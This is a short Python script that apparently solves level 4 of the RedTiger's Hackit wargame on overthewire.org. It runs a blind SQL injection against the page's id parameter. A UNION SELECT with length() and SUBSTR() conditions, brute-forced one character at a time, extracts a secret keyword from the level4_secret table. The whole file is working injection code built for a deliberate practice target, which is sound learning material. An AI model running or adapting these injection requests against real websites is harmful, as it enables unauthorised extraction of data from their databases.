""" Redtigers Challenge level 4"""
import requests

cookie={"level4login":"WontShowMyCookieSorry"} #Indeed i wont show you my cookie you first need the other 3 levels.
target = "http://redtiger.labs.overthewire.org/level4.php"
letters = "acbdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789*/-+!@$"
n = 0

for i in range(1,100):
    r = requests.get(target+"?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29="+str(i),cookies=cookie)
    if r.content.find("Query returned 2 rows.") != -1:
        n = i
        r.close()
        break
print 'Found password lenght : ',n
password = ''
for i in range(1,n+1):
    for j in letters :
        print 'Trying password: '+password+j
        r = requests.get(target+"?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20SUBSTR(keyword,"+str(i)+",1)='"+j+"'",cookies=cookie)
        if r.content.find("Query returned 2 rows.") != -1:
            password +=j
            break

r.close()
print 'Password is : ',password
